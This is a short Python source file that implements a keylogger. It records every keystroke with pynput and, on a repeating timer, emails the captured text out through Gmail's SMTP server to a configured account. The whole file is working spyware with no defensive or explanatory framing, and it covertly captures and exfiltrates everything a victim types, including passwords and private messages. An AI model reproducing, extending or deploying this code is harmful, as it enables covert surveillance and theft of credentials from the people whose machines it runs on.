import pynput.keyboard, smtplib, threading

class Keylogger:
    def __init__(self, report_interval, email, password):
        self.report_interval = report_interval
        self.email = email
        self.password = password
        self.log = ""

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            log = key.char
        except AttributeError:
            if key == key.space:
                log = " "
            else:
                log = " " + str(key) + " "
        self.append_to_log(log)

    def report(self):
        if self.log != "":
            self.send_mail(self.email, self.password, self.log)
            self.log = ""
        timer = threading.Timer(self.report_interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, "\n\n" + message)
        server.quit()

    def start(self):
        with pynput.keyboard.Listener(on_press=self.process_key_press) as listener:
            self.report()
            listener.join()
